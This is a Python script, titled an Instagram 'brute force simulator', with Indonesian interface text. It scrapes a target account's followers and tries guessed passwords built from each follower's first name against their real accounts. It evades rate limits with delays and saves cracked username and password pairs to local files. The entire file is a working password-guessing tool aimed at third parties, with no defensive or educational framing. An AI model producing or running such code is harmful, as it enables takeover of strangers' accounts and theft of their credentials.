import os
import json
import time
import random
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ChallengeRequired, PleaseWaitFewMinutes, FeedbackRequired
from utils.scraper import scrape_followers
from utils.brute_force import try_login
from colorama import Fore, init

init(autoreset=True)

DATA_FOLDER = "Data/akun1"
COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
HASH_DB = "hash_db.json"

def load_cookie():
    if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
        print(Fore.RED + "[!] cookie.txt atau user.txt tidak ditemukan.")
        exit()

    with open(USER_FILE, "r") as f:
        username = f.read().strip()

    with open(COOKIE_FILE, "r") as f:
        cookie_raw = f.read().strip()

    cookies = {}
    for part in cookie_raw.split(";"):
        if "=" in part:
            k, v = part.strip().split("=", 1)
            cookies[k] = v
    return username, cookies

def save_result(username, password):
    with open("hasil_sukses.txt", "a") as f:
        f.write(f"{username} | {password}\n")

def load_hash_db():
    if not os.path.exists(HASH_DB):
        return {}
    with open(HASH_DB, "r") as f:
        return json.load(f)

def update_hash_db(db):
    with open(HASH_DB, "w") as f:
        json.dump(db, f, indent=2)

def main():
    os.system("clear")
    print(Fore.CYAN + "== Gold3xp IG Brute Force Simulator ==")
    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip().lstrip("@")

    login_user, cookies = load_cookie()

    cl = Client()
    try:
        cl.login_by_sessionid(cookies.get("sessionid"))
        print(Fore.GREEN + f"[✓] Login berhasil sebagai @{login_user}")
    except Exception as e:
        print(Fore.RED + f"[✗] Gagal login: {e}")
        return

    print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
    followers = scrape_followers(cl, target_user)
    print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")

    hash_db = load_hash_db()

    for follower in followers:
        username = follower.get("username", "")
        full_name = follower.get("full_name", "")
        name_parts = full_name.split(" ")
        base = name_parts[0] if name_parts and name_parts[0] else username
        passwords = [base + str(i) for i in [123, 1234, 12345, 321, ""]]

        for password in passwords:
            print(Fore.YELLOW + f"⏳ Menguji: {username} | {password}")
            status = try_login(username, password)

            if status == "success":
                print(Fore.GREEN + f"✅ Valid: {username} | {password}")
                save_result(username, password)
                hash_db[username] = password
                update_hash_db(hash_db)
                break
            elif status == "challenge":
                print(Fore.RED + f"🔒 Checkpoint: {username}")
                break
            elif status == "feedback":
                print(Fore.MAGENTA + f"🔁 Rate limit. Jeda 60 detik...")
                time.sleep(60)
                break
            else:
                print(Fore.RED + f"❌ Invalid")
                time.sleep(random.uniform(1.5, 2.5))  # Delay aman

if __name__ == "__main__":
    main()
